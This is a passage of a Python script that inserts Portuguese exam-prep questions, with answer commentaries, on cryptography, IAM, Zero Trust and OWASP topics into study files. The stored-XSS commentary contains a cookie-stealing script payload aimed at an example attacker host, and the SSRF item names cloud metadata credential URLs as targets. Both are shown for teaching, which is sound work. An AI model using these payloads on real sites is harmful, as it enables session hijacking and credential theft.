* **E)** O carimbo do tempo é emitido exclusivamente pela operadora local de telefonia móvel sem uso de criptografia assimétrica.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Telnet transmite dados em texto claro e TXT não provê assinatura digital.
> - **B)** **CORRETA.** Normas e padrões do padrão ICP-Brasil e ETSI:
>   - **Autoridade de Carimbo do Tempo (ACT):** Terceira parte confiável que recebe o hash do documento e anexa um carimbo temporal assinado digitalmente com a Hora Legal Brasileira (HLB auditada pelo Observatório Nacional), provando tempestividade irretratável (que o documento existia antes de determinado momento e antes de eventual revogação da chave).
>   - **Padrões de Assinatura:**
>     - **CAdES (CMS Advanced Electronic Signatures):** Para qualquer arquivo binário genérico.
>     - **XAdES (XML Advanced Electronic Signatures):** Para documentos e notas fiscais em formato XML.
>     - **PAdES (PDF Advanced Electronic Signatures):** Para documentos em formato PDF nativo.
>   - Os perfis para longo prazo (*Long-Term Validation - LTV / perfis -A*) embutem as LCRs e respostas OCSP dentro da própria assinatura, garantindo validade mesmo após a expiração dos certificados dos emissores.
> - **C)** Incorreta. O relógio local da estação de trabalho pode ser facilmente alterado pelo usuário, não tendo valor probatório legal.
> - **D)** Incorreta. Macros de Word não possuem fé pública de ICP-Brasil.
> - **E)** Incorreta. A ACT é uma entidade credenciada na ICP-Brasil auditada pelo ITI que utiliza assinatura digital criptográfica estrita.
> 
> **Gabarito: B**

---
"""

    # Insert Q06 after 1.1 (before ### 1.2 Cifras de Bloco vs. Cifras de Fluxo)
    p1 = "### 1.2 Cifras de Bloco vs. Cifras de Fluxo (AES, DES, 3DES, ChaCha20)"
    assert p1 in content
    content = content.replace(p1, q06 + "\n" + p1, 1)

    # Insert Q07 after 1.2 (before ### 1.3 Modos de Operação de Bloco)
    p2 = "### 1.3 Modos de Operação de Bloco (ECB, CBC, CTR, GCM e AEAD)"
    assert p2 in content
    content = content.replace(p2, q07 + "\n" + p2, 1)

    # Insert Q08 after 2.3 (before ## 3. Funções de Resumo Criptográfico (Hash))
    p3 = "## 3. Funções de Resumo Criptográfico (Hash)"
    assert p3 in content
    content = content.replace(p3, q08 + "\n" + p3, 1)

    # Insert Q09 after 3.2 (before ## 4. Infraestrutura de Chaves Públicas e a ICP-Brasil)
    p4 = "## 4. Infraestrutura de Chaves Públicas e a ICP-Brasil"
    assert p4 in content
    content = content.replace(p4, q09 + "\n" + p4, 1)

    # Insert Q10 after 4.4 (before ## 5. Assinatura Digital e Validade Jurídica)
    p5 = "## 5. Assinatura Digital e Validade Jurídica"
    assert p5 in content
    content = content.replace(p5, q10 + "\n" + p5, 1)

    # Insert Q11 after 5.3 (before ## 6. Fontes Recomendadas na Internet)
    p6 = "## 6. Fontes Recomendadas na Internet"
    assert p6 in content
    content = content.replace(p6, q11 + "\n" + p6, 1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print("File 02 successfully enriched! Total questions:", len(re.findall(r"### Questão \d+", content)))


# ==============================================================================
# FILE 03: 03_controle_de_acesso_iam_e_arquitetura_zero_trust.md
# ==============================================================================
def enrich_file_03():
    path = os.path.join(BASE_DIR, "03_controle_de_acesso_iam_e_arquitetura_zero_trust.md")
    count, content = check_file(path)
    if count >= 10:
        print(f"File 03 already has {count} questions, skipping.")
        return

    q06 = """### Questão 06 (FGV - TRT / Analista Judiciário - TI - O Modelo AAA em Segurança da Informação)
O Modelo AAA (*Authentication, Authorization, Accounting*) é o framework arquitetural clássico utilizado para disciplinar a governança e o controle de acesso de usuários e sistemas em redes corporativas.

A respeito da distinção e das atribuições de cada um dos três pilares do modelo AAA, assinale a afirmativa correta:

* **A)** A Autorização (*Authorization*) ocorre antes da Autenticação e consiste na digitação do login e senha pelo usuário.
* **B)** A Autenticação (*Authentication*) verifica a veracidade da identidade alegada pelo sujeito; a Autorização (*Authorization*) determina quais recursos específicos e permissões (leitura, escrita, exclusão) esse sujeito autenticado tem direito de acessar; e a Auditoria (*Accounting/Auditing*) rastreia e registra as ações executadas e o consumo de recursos para fins de responsabilização e conformidade.
* **C)** O pilar de *Accounting* é dispensável em órgãos públicos porque auditorias violam o direito de privacidade funcional dos servidores.
* **D)** A Autorização garante que a identidade nunca será contestada perante um tribunal judicial.
* **E)** Todos os três pilares são executados exclusivamente através de cartões magnéticos sem uso de software ou logs de sistema.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. A ordem lógica cronológica e mandatória do modelo AAA é: 1º **Identificação**, 2º **Autenticação** (provar que é quem diz ser), 3º **Autorização** (conceder os privilégios específicos) e 4º **Auditoria/Accounting** (monitorar e registrar).
> - **B)** **CORRETA.** Definição ontológica precisa do **Modelo AAA**:
>   1. **Authentication (Autenticação):** Processo de validação das credenciais para confirmar que a entidade é realmente quem afirma ser (*"Você é quem diz ser?"*).
>   2. **Authorization (Autorização):** Definição das políticas e concessão de privilégios com base na identidade validada (*"O que você tem permissão para fazer?"*).
>   3. **Accounting (Contabilização / Auditoria):** Registro cronológico e detalhado de todas as atividades, conexões, comandos e recursos acessados (*"O que você efetivamente fez e quando?"*), garantindo a responsabilização (*non-repudiation / accountability*).
> - **C)** Incorreta. A auditoria e prestação de contas (*Accounting*) é dever constitucional basilar da administração pública.
> - **D)** Incorreta. Essa propriedade refere-se ao Não Repúdio (*Non-Repudiation*), viabilizado por assinaturas e trilhas seguras.
> - **E)** Incorreta. O modelo AAA é implementado por protocolos modernos como RADIUS, TACACS+, Diameter, LDAP e plataformas de IAM.
> 
> **Gabarito: B**

---
"""

    q07 = """### Questão 07 (FCC - TRT / Analista Judiciário - TI - Vetores de Ataque contra Credenciais: Spraying vs. Stuffing)
Ataques cibernéticos direcionados a identidades e mecanismos de autenticação representam o principal vetor de invasão a redes corporativas de tribunais e órgãos governamentais.

Dois ataques comuns e sofisticados que burlam políticas tradicionais de bloqueio de conta por tentativas consecutivas são o **Password Spraying** e o **Credential Stuffing**. A distinção técnica precisa entre essas duas modalidades de ataque consiste em:

* **A)** No *Credential Stuffing*, o atacante testa milhões de senhas em uma única conta até forçar a quebra; ao passo que no *Password Spraying*, ele infecta o roteador com um worm.
* **B)** No **Password Spraying**, o atacante testa uma única senha comum e fraca (como `Tribunal@2024`) contra milhares de nomes de usuários corporativos distintos em intervalos espaçados para evitar o disparo de regras de bloqueio de conta por excesso de falhas; enquanto no **Credential Stuffing**, o atacante utiliza listas automatizadas de pares de e-mail/senha vazados de outros serviços e violações prévias na internet, explorando o hábito generalizado dos usuários de reutilizarem as mesmas credenciais em múltiplos portais.
* **C)** Ambos os ataques utilizam exclusivamente redes sem fio Bluetooth a curta distância para interceptar senhas em tempo real.
* **D)** O *Password Spraying* é um ataque físico que arromba as fechaduras do datacenter.
* **E)** A autenticação multifator (MFA) é ineficaz contra esses ataques, pois os robôs conseguem clonar biometria física à distância.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Testar milhões de senhas em uma única conta é um ataque tradicional de **Força Bruta (*Brute Force*)**, facilmente contido por bloqueio de conta após 3 a 5 tentativas erradas.
> - **B)** **CORRETA.** Distinção precisa dos vetores de ataque modernos a credenciais:
>   - **Password Spraying (Pulverização de Senhas):** Inverte o eixo da força bruta. Em vez de testar muitas senhas em uma conta (o que trava a conta), o atacante testa **uma ou duas senhas prováveis em centenas ou milhares de contas diferentes** com pausas temporais. Como há apenas 1 tentativa por conta por hora, as regras de bloqueio por tentativas falhas não são acionadas.
>   - **Credential Stuffing (Preenchimento de Credenciais):** Ataque automatizado em massa que consome bases de dados de credenciais vazadas em brechas públicas (*dumps* da Dark Web). O atacante parte do pressuposto estatístico de que muitos usuários reutilizam a mesma senha do e-mail pessoal ou redes sociais no e-mail corporativo.
>   - **Mitigação Principal:** Adoção obrigatória de **Autenticação Multifator (MFA)** resistente a phishing (FIDO2/WebAuthn), detecção comportamental de anomalias de login e análise contínua de senhas comprometidas.
> - **C)** Incorreta. São ataques realizados remotamente via protocolos web/API ou serviços de diretório.
> - **D)** Incorreta. Trata-se de ameaça lógica a credenciais.
> - **E)** Incorreta. A autenticação multifator (MFA) é precisamente o controle mais eficaz para neutralizar o impacto de ambos os ataques.
> 
> **Gabarito: B**

---
"""

    q08 = """### Questão 08 (FGV - TRT / Analista Judiciário - TI - Controle de Acesso RBAC e Variações NIST)
O modelo de Controle de Acesso Baseado em Papéis (*Role-Based Access Control - RBAC*), formalizado pelo NIST (norma ANSI/INCITS 359-2004), é o padrão mais amplamente implementado em sistemas corporativos governamentais.

A respeito das variações normativas da família RBAC do NIST, assinale a afirmativa correta:

* **A)** O RBAC0 é a forma mais complexa do modelo, exigindo inteligência artificial quântica para alocação de usuários.
* **B)** O **RBAC1** adiciona o conceito de **Hierarquia de Papéis** (*Role Hierarchy*), no qual papéis seniores herdam automaticamente todas as permissões concedidas aos papéis juniores; e o **RBAC2** introduz restrições formais de **Separação de Funções** (*Separation of Duties - SoD*), divididas em SoD Estática (SSD, impedindo que um usuário pertença a papéis conflitantes) e SoD Dinâmica (DSD, permitindo a titularidade dos papéis, mas impedindo que sejam ativados simultaneamente na mesma sessão).
* **C)** O RBAC2 proíbe que um auditor possua mais de uma função em toda a sua vida profissional.
* **D)** O RBAC3 é a simplificação mínima que revoga todos os privilégios de todos os usuários corporativos.
* **E)** O modelo RBAC atribui permissões diretamente aos nomes de pessoas físicas, proibindo a criação de papéis ou perfis intermediários.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. O **RBAC0** (*Core RBAC*) é o modelo elementar básico (usuários, papéis, permissões e sessões), sem hierarquia ou restrições.
> - **B)** **CORRETA.** Taxonomia formal do **NIST RBAC**:
>   - **RBAC0 (Core):** Conjuntos de Usuários, Papéis (*Roles*) e Permissões. Permissões são associadas a papéis, e usuários são vinculados a papéis.
>   - **RBAC1 (Hierarchical):** Adiciona herança de papéis ($RBAC0 + \\text{Hierarquia}$). Um papel superior (ex.: Diretor de Auditoria) herda todos os privilégios do papel subordinado (Auditor Fiscal).
>   - **RBAC2 (Constraint):** Adiciona regras de Separação de Funções ($RBAC0 + \\text{Restrições SoD}$). A SoD Estática (*SSD*) impede a atribuição de papéis conflitantes (ex.: quem cria empenho não pode ser do papel que aprova pagamento); a SoD Dinâmica (*DSD*) restringe a ativação na mesma sessão.
>   - **RBAC3 (Unified):** Combina simultaneamente hierarquia e restrições de separação de funções ($RBAC1 + RBAC2$).
> - **C)** Incorreta. O SoD restringe conflitos de interesse específicos entre papéis críticos, não a carreira do profissional.
> - **D)** Incorreta. O RBAC3 é o modelo unificado completo.
> - **E)** Incorreta. A definição basilar do RBAC é justamente **desacoplar** usuários de permissões diretas por meio de papéis.
> 
> **Gabarito: B**

---
"""

    q09 = """### Questão 09 (FCC - TRT / Analista Judiciário - TI - Controle de Acesso ABAC e a Arquitetura XACML)
Em ambientes corporativos complexos com requisitos dinâmicos de auditoria, o Controle de Acesso Baseado em Atributos (*Attribute-Based Access Control - ABAC*) supera as limitações do RBAC ao avaliar atributos do sujeito, do recurso, da ação e do contexto ambiental (como horário, localização IP e nível de ameaça).

Na implementação padrão do ABAC segundo a norma **XACML** (*eXtensible Access Control Markup Language* da OASIS), o componente de software que atua como o ponto de decisão, avaliando as políticas de acesso e emitindo a decisão autorizativa (*Permit* ou *Deny*), é denominado:

* **A)** Policy Enforcement Point (PEP).
* **B)** Policy Decision Point (PDP).
* **C)** Policy Administration Point (PAP).
* **D)** Policy Information Point (PIP).
* **E)** Security Assertion Markup Language (SAML).

> **Comentário Detalhado:**
>
> - **A)** Incorreta. O **PEP (Policy Enforcement Point)** é o ponto de interceptação e aplicação que intercepta a requisição do usuário, repassa ao PDP e aplica a decisão (*bloqueia ou libera*).
> - **B)** **CORRETA.** Arquitetura canônica de referência do **XACML / ABAC**:
>   - **PDP (Policy Decision Point):** O "cérebro" avaliador. Recebe a solicitação do PEP, busca os atributos necessários no PIP, confronta as regras e políticas vindas do PAP e profere a decisão lógica (*Permit*, *Deny*, *NotApplicable* ou *Indeterminate*).
>   - **PEP (Policy Enforcement Point):** O interceptador e executor no plano de dados.
>   - **PAP (Policy Administration Point):** O repositório administrativo onde os administradores criam, gerenciam e armazenam as políticas XACML.
>   - **PIP (Policy Information Point):** A fonte de atributos que fornece dados sobre o sujeito, recurso ou ambiente (ex.: Active Directory, servidores de geolocalização).
> - **C)** Incorreta. O PAP apenas gerencia e armazena os arquivos de políticas.
> - **D)** Incorreta. O PIP é a fonte de dados que provê os valores dos atributos.
> - **E)** Incorreta. SAML é um padrão de asserção de identidade para federação, não o motor de decisão do XACML.
> 
> **Gabarito: B**

---
"""

    q10 = """### Questão 10 (FGV - TRT / Analista Judiciário - TI - Federação de Identidades e SSO: SAML vs. OpenID Connect)
A federação de identidades permite que os servidores de um tribunal acessem múltiplos sistemas governamentais integrados utilizando uma única conta corporativa com o mecanismo de *Single Sign-On* (SSO).

A respeito dos protocolos padronizados de autenticação e autorização federada, assinale a afirmativa correta:

* **A)** O protocolo SAML 2.0 utiliza tokens ultraleves em formato JSON, enquanto o OpenID Connect é baseado em mensagens pesadas em XML.
* **B)** O **OAuth 2.0** é estritamente um framework de **Autorização** (concessão de permissões via tokens de acesso delegados), ao passo que o **OpenID Connect (OIDC)** é uma camada de **Autenticação** construída no topo do OAuth 2.0, que introduz o token de identidade padronizado (*ID Token*) no formato JSON Web Token (JWT) para comprovar quem é o usuário.
* **C)** No protocolo SAML 2.0, o Provedor de Identidade (IdP) e o Provedor de Serviço (SP) operam sem qualquer chave pública ou certificado X.509.
* **D)** O OpenID Connect exige compulsoriamente o envio da senha em texto claro do usuário para todas as aplicações de terceiros conectadas.
* **E)** O mecanismo de Single Sign-On obriga o usuário a digitar sua senha novamente a cada novo clique em uma página do portal.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Inverteu os padrões: o **SAML 2.0** é baseado em asserções estruturadas e pesadas em **XML** assinadas com certificados X.509; o **OpenID Connect** é moderno, baseado em REST/JSON e tokens JWT (*JSON Web Tokens*).
> - **B)** **CORRETA.** Relação arquitetural fundamental entre **OAuth 2.0 e OIDC**:
>   - **OAuth 2.0 (RFC 6749):** Framework de autorização delegado (*delegated authorization*). Emite `Access Tokens` que dizem a uma API o que o cliente pode acessar, mas **não é um protocolo de autenticação** (não diz à aplicação cliente quem é o usuário nem como ele se autenticou).
>   - **OpenID Connect (OIDC):** Estende o OAuth 2.0 para adicionar a camada de autenticação que faltava. Emite um **ID Token** (formato JWT assinado digitalmente contendo asserções de identidade ou *claims*, como `sub`, `iss`, `email`, `auth_time`), permitindo que a aplicação cliente valide a identidade do sujeito com segurança em aplicações web e mobile.
> - **C)** Incorreta. SAML 2.0 requer certificados X.509 em ambas as pontas para assinar e cifrar as asserções XML.
> - **D)** Incorreta. Em federação, a aplicação cliente **jamais vê a senha do usuário**; a autenticação ocorre exclusivamente no Provedor de Identidade (IdP).
> - **E)** Incorreta. O propósito basilar do SSO (*Single Sign-On*) é autenticar o usuário uma única vez e permitir acesso transparente a múltiplos sistemas durante a sessão.
> 
> **Gabarito: B**

---
"""

    q11 = """### Questão 11 (FGV - TRT / Analista Judiciário - TI - Arquitetura Zero Trust: Microsegmentação de Rede)
A publicação especial NIST SP 800-207 consolida a Arquitetura Zero Trust (ZTA), superando o modelo obsoleto de segurança de perímetro baseado em "castelo e fosso", adotando o lema: *"Nunca Confie, Sempre Verifique"*.

Dentre os pilares técnicos fundamentais do Zero Trust, a técnica de **Microsegmentação** de rede tem por finalidade primordial:

* **A)** Unificar todas as redes, estações de trabalho e bancos de dados em uma única VLAN plana sem roteadores.
* **B)** Dividir o datacenter corporativo em zonas lógicas de segurança altamente granulares e isoladas no nível de carga de trabalho (*workload*), aplicando políticas estritas de comunicação L7 que inspecionam o tráfego leste-oeste (*East-West traffic*), com o propósito específico de conter e impedir a **movimentação lateral** de atacantes em caso de comprometimento de um nó da rede.
* **C)** Garantir que todos os pacotes de rede sejam transmitidos sem criptografia para facilitar o monitoramento passivo.
* **D)** Aumentar a área de broadcast da rede para acelerar transmissões de vídeo em alta resolução.
* **E)** Eliminar completamente o uso de firewalls e sistemas de controle de acesso nos servidores centrais.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Uma rede plana (sem segmentação) é a antítese do Zero Trust, permitindo que um atacante que invada uma máquina tenha livre acesso a todos os servidores do tribunal.
> - **B)** **CORRETA.** Fundamentos da **Microsegmentação no Zero Trust**:
>   - No modelo tradicional, o firewall de borda protegia o tráfego norte-sul (entrada e saída da internet), mas o interior da rede era considerado confiável (tráfego leste-oeste livre).
>   - Na ZTA (NIST SP 800-207), assume-se a premissa de comprometimento prévio (*Assume Breach*). A **microsegmentação** cria perímetros de segurança microscópicos e dinâmicos ao redor de cada serviço, contêiner ou máquina virtual.
>   - Mesmo que um invasor comprometa uma estação de trabalho de um estagiário ou um servidor web na DMZ, ele fica enclausurado naquele microsegmento isolado, **sendo bloqueado em qualquer tentativa de movimento lateral (*lateral movement*)** em direção ao banco de dados ou controladores de domínio.
> - **C)** Incorreta. O Zero Trust exige criptografia em trânsito ponta a ponta (mTLS) em toda comunicação interna.
> - **D)** Incorreta. A microsegmentação elimina domínios de broadcast amplos.
> - **E)** Incorreta. Ela multiplica a aplicação de regras granulares de filtragem lógica em cada nó.
> 
> **Gabarito: B**

---
"""

    # Insert Q06 after 1.1 (before ### 1.2 Os Três Fatores Clássicos de Autenticação)
    p1 = "### 1.2 Os Três Fatores Clássicos de Autenticação"
    assert p1 in content
    content = content.replace(p1, q06 + "\n" + p1, 1)

    # Insert Q07 after 1.4 (before ## 2. Modelos Clássicos de Controle de Acesso Lógico)
    p2 = "## 2. Modelos Clássicos de Controle de Acesso Lógico"
    assert p2 in content
    content = content.replace(p2, q07 + "\n" + p2, 1)

    # Insert Q08 after 2.4 (before ### 2.5 ABAC (Attribute-Based Access Control) e a Norma XACML)
    p3 = "### 2.5 ABAC (Attribute-Based Access Control) e a Norma XACML"
    assert p3 in content
    content = content.replace(p3, q08 + "\n" + p3, 1)

    # Insert Q09 after 2.5 (before ## 3. Gestão de Identidades e Acessos (IAM) e PAM)
    p4 = "## 3. Gestão de Identidades e Acessos (IAM) e PAM"
    assert p4 in content
    content = content.replace(p4, q09 + "\n" + p4, 1)

    # Insert Q10 after 3.4 (before ## 4. Arquitetura Zero Trust (Confiança Zero - NIST SP 800-207))
    p5 = "## 4. Arquitetura Zero Trust (Confiança Zero - NIST SP 800-207)"
    assert p5 in content
    content = content.replace(p5, q10 + "\n" + p5, 1)

    # Insert Q11 after 4.4 (before ### 4.5 Componentes Lógicos: Policy Engine (PE))
    p6 = "### 4.5 Componentes Lógicos: Policy Engine (PE), Policy Administrator (PA) e Policy Enforcement Point (PEP)"
    assert p6 in content
    content = content.replace(p6, q11 + "\n" + p6, 1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print("File 03 successfully enriched! Total questions:", len(re.findall(r"### Questão \d+", content)))


# ==============================================================================
# FILE 04: 04_seguranca_em_aplicacoes_owasp_top_10_e_devsecops.md
# ==============================================================================
def enrich_file_04():
    path = os.path.join(BASE_DIR, "04_seguranca_em_aplicacoes_owasp_top_10_e_devsecops.md")
    count, content = check_file(path)
    if count >= 10:
        print(f"File 04 already has {count} questions, skipping.")
        return

    q06 = """### Questão 06 (FGV - TRT / Analista Judiciário - TI - OWASP #2 Falhas Criptográficas e Armazenamento de Senhas)
No ranking OWASP Top 10:2021, a categoria **A02:2021 - Cryptographic Failures** aborda falhas relacionadas à ausência ou fragilidade de criptografia na proteção de dados sensíveis em repouso e em trânsito.

No desenvolvimento de sistemas de processo judicial e administrativo eletrônico, a diretriz recomendada pela OWASP e pelo NIST para armazenar senhas de usuários em bancos de dados de forma estritamente segura consiste em:

* **A)** Cifrar as senhas utilizando o algoritmo simétrico DES em modo ECB sem chave secreta.
* **B)** Armazenar as senhas aplicando uma função hash rápida simples como MD5 ou SHA-1 pura sem qualquer valor de sal (*salt*).
* **C)** Utilizar uma função de derivação de chaves adaptativa e deliberadamente lenta com alto consumo de memória (*memory-hard* / *work factor* ajustável), tais como **Argon2id**, **bcrypt** ou **PBKDF2**, combinada com um **Salt** criptograficamente aleatório e exclusivo para cada usuário gerado com no mínimo 128 bits.
* **D)** Gravar as senhas em texto puro (*plaintext*) protegido apenas por permissão de arquivo no Linux.
* **E)** Converter a senha em caracteres Base64 invertidos e armazenar em uma coluna pública da tabela de usuários.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Criptografia reversível não deve ser usada para senhas de autenticação; senhas exigem funções unidirecionais não reversíveis. Além disso, DES é um algoritmo quebrado e obsoleto.
> - **B)** Incorreta. Hashes rápidos comuns (MD5, SHA-1, SHA-256) são catastróficos para senhas: atacantes conseguem testar bilhões de palpites por segundo em GPUs comuns e utilizar tabelas arco-íris (*Rainbow Tables*) pré-computadas na ausência de salt.
> - **C)** **CORRETA.** Padrão ouro da OWASP e NIST SP 800-63B para armazenamento de senhas:
>   - **Salt (Sal Criptográfico):** Sequência aleatória exclusiva gerada para cada usuário e concatenada à senha antes do hash, tornando tabelas arco-íris totalmente inúteis e garantindo que dois usuários com a mesma senha tenham hashes físicos completamente distintos.
>   - **Funções de Hashing Lentas e Adaptativas (Key Derivation Functions - KDF):** Algoritmos como **Argon2id** (vencedor da *Password Hashing Competition*), **bcrypt** e **PBKDF2** impõem custos massivos de tempo e memória RAM (*memory-hard*), tornando ataques de força bruta com placas de vídeo e ASICs inviáveis economicamente.
> - **D)** Incorreta. Violação elementar e gravíssima de segurança.
> - **E)** Incorreta. Base64 é apenas um esquema de codificação reversível, desprovido de qualquer segurança ou segredo criptográfico.
> 
> **Gabarito: C**

---
"""

    q07 = """### Questão 07 (FCC - TRT / Analista Judiciário - TI - Modalidades de Cross-Site Scripting: XSS)
A vulnerabilidade de *Cross-Site Scripting* (XSS) ocorre quando uma aplicação web inclui dados não confiáveis em uma página web sem a devida validação ou escape, permitindo que scripts maliciosos (geralmente JavaScript) sejam executados no navegador da vítima.

A literatura da OWASP e os manuais de segurança em aplicações web classificam o XSS em três modalidades primordiais: **XSS Armazenado (*Stored*)**, **XSS Refletido (*Reflected*)** e **XSS Baseado em DOM (*DOM-based*)**.

Assinale a afirmativa que descreve corretamente o **XSS Armazenado (Stored / Persistent XSS)**:

* **A)** O script hostil é enviado em uma requisição HTTP imediata (como um parâmetro de busca em link) e refletido instantaneamente na resposta do servidor sem ser persistido em banco de dados.
* **B)** A injeção maliciosa é salva de forma persistente no banco de dados do servidor (ex.: em um campo de comentários de processo, fórum ou cadastro de fornecedor); toda vez que um usuário legítimo ou auditor carrega a página correspondente, o script hostil gravado é renderizado e executado automaticamente em seu navegador, podendo roubar cookies de sessão e realizar ações em nome da vítima.
* **C)** O ataque ocorre exclusivamente pela manipulação do objeto `window.location` no código JavaScript local do navegador sem qualquer tráfego com o servidor.
* **D)** O XSS armazenado afeta apenas computadores desligados sem conexão com a rede elétrica.
* **E)** Trata-se de uma falha exclusiva de hardware que destrói a memória física do monitor de vídeo.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Essa é a definição clássica do **XSS Refletido (Reflected XSS)**, que exige que a vítima clique em um link forjado contendo o payload no parâmetro da URL.
> - **B)** **CORRETA.** O **XSS Armazenado (Stored / Persistent XSS)** é a variante mais devastadora:
>   - O atacante insere o código malicioso (`<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>`) em um campo de entrada persistido pela aplicação (ex.: cadastro de processo, petição, mural de avisos).
>   - O dado é gravado no banco de dados.
>   - Qualquer usuário, gestor ou auditor que posteriormente acessar a página que renderiza esse registro executa o script no contexto de segurança da sua sessão autenticada.
>   - **Defesa:** Sanitização estrita de entrada, codificação de caracteres na saída contextualmente (*Context-Aware Output Encoding*) e implementação do cabeçalho HTTP **Content Security Policy (CSP)**.
> - **C)** Incorreta. Essa é a definição do **DOM-based XSS**, onde a vulnerabilidade reside inteiramente no código JavaScript do lado cliente que manipula o DOM.
> - **D)** Incorreta. O ataque roda ativamente no navegador da vítima.
> - **E)** Incorreta. Trata-se de uma vulnerabilidade de software na camada de aplicação web.
> 
> **Gabarito: B**

---
"""

    q08 = """### Questão 08 (FGV - TRT / Analista Judiciário - TI - Server-Side Request Forgery: SSRF)
A categoria **A10:2021 - Server-Side Request Forgery (SSRF)** foi incluída formalmente no OWASP Top 10 devido à sua alta criticidade em arquiteturas modernas baseadas em nuvem e microsserviços.

A vulnerabilidade de SSRF caracteriza-se quando:

* **A)** O navegador do usuário envia requisições forjadas para a impressora local via Wi-Fi.
* **B)** Uma aplicação web servidora é induzida por um atacante a realizar requisições HTTP arbitrárias e desprotegidas para destinos remotos ou para recursos internos da própria rede do servidor (tais como serviços de metadados da nuvem - ex.: `http://169.254.169.254` na AWS/Azure/GCP -, portas locais de loopback `127.0.0.1` ou bancos de dados isolados por firewall), permitindo ao invasor acessar dados confidenciais e credenciais de instâncias.
* **C)** O banco de dados relacional rejeita qualquer comando com a cláusula `WHERE`.
* **D)** O cabo de rede do servidor sofre interferência eletromagnética por tempestades solares.
* **E)** O usuário esquece sua senha corporativa e solicita redefinição pelo portal de autoatendimento.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Não se trata de ataque originado do cliente local.
> - **B)** **CORRETA.** Mecânica do ataque **SSRF (Server-Side Request Forgery)**:
>   - Ocorre quando um servidor web aceita uma URL fornecida pelo usuário para buscar uma imagem, importar um arquivo ou ler um webhook, mas não valida adequadamente o endereço de destino.
>   - O invasor fornece uma URL interna (ex.: `http://169.254.169.254/latest/meta-data/identity-credentials` ou `http://localhost:8080/admin`).
>   - O próprio servidor da aplicação web (que tem privilégios e confiança dentro da rede interna e acesso aos serviços locais) dispara a requisição e devolve o conteúdo ao invasor, ultrapassando firewalls de borda e expondo credenciais de instâncias e segredos de microsserviços internos.
>   - **Defesa:** Whitelisting estrito de domínios permitidos, bloqueio de faixas de IP privadas/loopback/link-local e uso de IMDSv2 com tokens de sessão em provedores de nuvem.
> - **C)** Incorreta. Descrição desconexa com requisições HTTP forjadas.
> - **D)** Incorreta. Fenômeno de camada física não relacionado à lógica de software.
> - **E)** Incorreta. Procedimento normal de suporte a senhas.
> 
> **Gabarito: B**

---
"""

    q09 = """### Questão 09 (FCC - TRT / Analista Judiciário - TI - DevSecOps e o Paradigma Shift-Left)
A cultura **DevSecOps** prega a integração contínua de práticas e controles de segurança em todas as fases do ciclo de vida de desenvolvimento de software (SDLC), operando sob o princípio do **Shift-Left** (Deslocar para a Esquerda).

O fundamento econômico e técnico que justifica a adoção do princípio *Shift-Left* nas esteiras de integração e entrega contínua (CI/CD) de tribunais reside no fato de que:

* **A)** O custo financeiro e o esforço de engenharia necessários para remediar uma vulnerabilidade de segurança crescem exponencialmente à medida que a falha avança pelas fases do ciclo de desenvolvimento, sendo infinitamente mais barato e ágil corrigi-la precocemente durante as fases de design e codificação do que após a entrada do sistema em produção.
* **B)** A segurança da informação deve ser delegada exclusivamente a uma equipe externa de auditores no dia anterior ao lançamento do sistema em produção.
* **C)** Testes automatizados de segurança desaceleram os deploys e, portanto, devem ser excluídos dos pipelines de CI/CD.
* **D)** O termo Shift-Left indica que todos os programadores devem trabalhar obrigatoriamente com a mão esquerda no teclado.
* **E)** O DevSecOps preconiza a eliminação completa dos desenvolvedores de software, mantendo apenas profissionais de segurança física patrimonial.

> **Comentário Detalhado:**
>
> - **A)** **CORRETA.** A **Economia da Correção Precoce (Shift-Left)** é o pilar econômico do DevSecOps:
>   - Conforme estudos consolidados da Engenharia de Software (Barry Boehm / NIST), corrigir um defeito ou vulnerabilidade de segurança em **Produção** custa de **30 a 100 vezes mais** do que corrigi-lo durante a fase de **Design ou Codificação**.
>   - No modelo cascata legado, a segurança atuava apenas como um "portão tardio" (*late gate*) antes do lançamento, gerando retrabalho massivo ou liberação de sistemas com falhas graves.
>   - No DevSecOps, "desloca-se a segurança para a esquerda" da linha do tempo: inserem-se modelagem de ameaças no planejamento, análise estática de código (SAST) no commit do desenvolvedor e verificação de dependências (SCA) no build, corrigindo bugs no mesmo instante em que são escritos.
> - **B)** Incorreta. Esse é o modelo obsoleto que a cultura DevSecOps combate.
> - **C)** Incorreta. A automação no pipeline é justamente o que viabiliza velocidade com conformidade contínua (*Security as Code*).
> - **D)** Incorreta. É uma metáfora temporal da esteira SDLC (da esquerda para a direita: requisitos $\to$ código $\to$ build $\to$ teste $\to$ deploy $\to$ produção).
> - **E)** Incorreta. O DevSecOps promove a colaboração multidisciplinar e responsabilidade compartilhada entre Desenvolvimento, Segurança e Operações.
> 
> **Gabarito: A**

---
"""

    q10 = """### Questão 10 (FGV - TRT / Analista Judiciário - TI - OWASP API Security Top 10 e Vulnerabilidade BOLA)
As arquiteturas orientadas a microsserviços dependem extensivamente de APIs RESTful para integração de dados em órgãos públicos. O projeto OWASP mantém um ranking específico para esse segmento: o **OWASP API Security Top 10**.

A vulnerabilidade categorizada como **API1:2023 - Broken Object Level Authorization (BOLA)**, historicamente associada ao conceito de IDOR em navegadores, é caracterizada quando:

* **A)** A API é atacada por um vírus de setor de inicialização que formata o disco rígido do servidor de aplicação.
* **B)** Os endpoints da API expõem identificadores de objetos diretamente na URI (como `GET /api/v1/contratos/10452/dados_sigilosos`) e o código do backend falha em validar se o usuário autenticado que originou a requisição possui realmente direito legal de acesso àquele objeto específico de terceiro, permitindo que qualquer usuário altere o ID numérico na requisição para visualizar dados restritos de outros cidadãos ou órgãos.
* **C)** O certificado digital HTTPS expira e a API passa a responder com código de status HTTP 404.
* **D)** A API utiliza tokens JWT com assinatura criptográfica assimétrica de 4096 bits devidamente validada em todas as chamadas.
* **E)** Um invasor sobrecarrega o servidor enviando requisições com a sintaxe correta do protocolo GraphQL.

> **Comentário Detalhado:**
>
